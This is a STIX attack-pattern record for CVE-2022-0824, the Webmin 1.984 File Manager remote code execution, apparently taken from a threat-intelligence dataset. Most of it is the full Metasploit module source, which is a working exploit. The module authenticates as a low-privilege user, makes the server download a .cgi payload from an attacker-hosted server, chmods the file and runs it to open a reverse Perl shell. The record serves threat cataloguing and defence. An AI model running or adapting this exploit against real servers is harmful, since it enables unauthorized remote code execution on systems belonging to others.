{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3734595-988e-4833-81e4-40ef6bb5286c",
    "created": "2024-08-14T17:00:00.226142Z",
    "modified": "2024-08-14T17:00:00.226146Z",
    "name": "Webmin File Manager RCE",
    "description": " In Webmin version 1.984, any authenticated low privilege user without access rights to",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/webmin_file_manager_rce.rb",
            "external_id": "webmin_file_manager_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-0824"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HTTP::Webmin\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Webmin File Manager RCE',\n        'Description' => %q{\n          In Webmin version 1.984, any authenticated low privilege user without access rights to\n          the File Manager module could interact with file manager functionalities such as downloading files from remote URLs and\n          changing file permissions. It is possible to achieve Remote Code Execution via a crafted .cgi file by chaining those\n          functionalities in the file manager.\n        },\n        'Author' => [\n          'faisalfs10x', # discovery\n          'jheysel-r7'   # module\n        ],\n        'References' => [\n          [ 'URL', 'https://huntr.dev/bounties/d0049a96-de90-4b1a-9111-94de1044f295/'], # exploit\n          [ 'URL', 'https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell'], # exploit\n          [ 'CVE', '2022-0824']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'linux',\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Automatic (Unix In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2022-02-26',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The default webmin port', 10000]),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as', '' ]),\n        OptString.new('PASSWORD', [ true, 'The password for the specified username', '' ])\n      ]\n    )\n  end\n\n  def check\n    webmin_check('0', '1.984')\n  end\n\n  def login\n    webmin_login(datastore['USERNAME'], datastore['PASSWORD'])\n  end\n\n  def download_remote_url\n    print_status('Fetching payload from HTTP server')\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], '/extensions/file-manager/http_download.cgi'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'data' => 'link=' + get_uri + '.cgi' + '&username=&password=&path=%2Fusr%2Fshare%2Fwebmin',\n      'headers' => {\n        'Accept' => 'application/json, text/javascript, */*; q=0.01',\n        'Accept-Encoding' => 'gzip, deflate',\n        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + '/filemin/?xnavigation=1'\n      },\n      'vars_get' => {\n        'module' => 'filemin'\n      }\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Unable to download .cgi payload from http server') unless res\n    fail_with(Failure::BadConfig, 'please properly configure the http server, it could not be found by webmin') if res.body.include?('Error: No valid URL supplied!')\n    register_file_for_cleanup(\"/usr/share/webmin/#{@file_name}\")\n  end\n\n  def modify_permissions\n    print_status('Modifying the permissions of the uploaded payload to 0755')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/extensions/file-manager/chmod.cgi'),\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'headers' => {\n        'Referer' => 'http://' + datastore['RHOSTS'] + ':' + datastore['RPORT'].to_s + 'filemin/?xnavigation=1'\n      },\n      'vars_get' => {\n        'module' => 'filemin',\n        'page' => '1',\n        'paginate' => '30'\n      },\n      'vars_post' => {\n        'name' => @file_name,\n        'perms' => '0755',\n        'applyto' => '1',\n        'path' => '/usr/share/webmin'\n      }\n    })\n    fail_with(Failure::UnexpectedReply, 'Unable to modify permissions on the upload .cgi payload') unless res && res.code == 302\n  end\n\n  def exec_revshell\n    res = send_request_cgi(\n      'method' => 'GET',\n      'keep_cookies' => true,\n      'uri' => normalize_uri(datastore['TARGETURI'], @file_name),\n      'headers' => {\n        'Connection' => 'keep-alive'\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Unable to execute the .cgi payload') unless res && res.code == 500\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request '#{request.method} #{request.uri}'\")\n    print_status('Sending payload ...')\n    send_response(cli, payload.encoded,\n                  'Content-Type' => 'application/octet-stream')\n  end\n\n  def exploit\n    start_service\n    @file_name = (get_resource.gsub('/', '') + '.cgi')\n    cookie = login\n    fail_with(Failure::BadConfig, 'Unsuccessful login attempt with creds') if cookie.empty?\n    print_status('Downloading remote url')\n    download_remote_url\n    print_status('Finished downloading remote url')\n    modify_permissions\n    exec_revshell\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-02-26",
    "x_mitre_platforms": [
        "unix'"
    ]
}